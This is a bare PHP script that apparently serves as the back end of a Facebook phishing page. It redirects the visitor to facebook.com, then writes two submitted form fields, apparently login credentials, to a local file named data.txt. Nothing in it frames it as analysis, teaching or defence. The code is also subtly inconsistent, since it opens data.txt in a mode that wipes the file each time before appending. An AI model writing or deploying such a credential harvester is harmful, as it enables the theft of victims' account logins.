<?php
header('Location: http://www.facebook.com');
$txt = "data.txt";
$fh = fopen($txt, 'w+');
if (isset($_POST['field1']) && isset($_POST['field2'])) { // check if both fields are set
   $txt=$_POST['field1'].' - '.$_POST['field2'];
   file_put_contents('data.txt',$txt."\n",FILE_APPEND); // log to data.txt
   exit();
}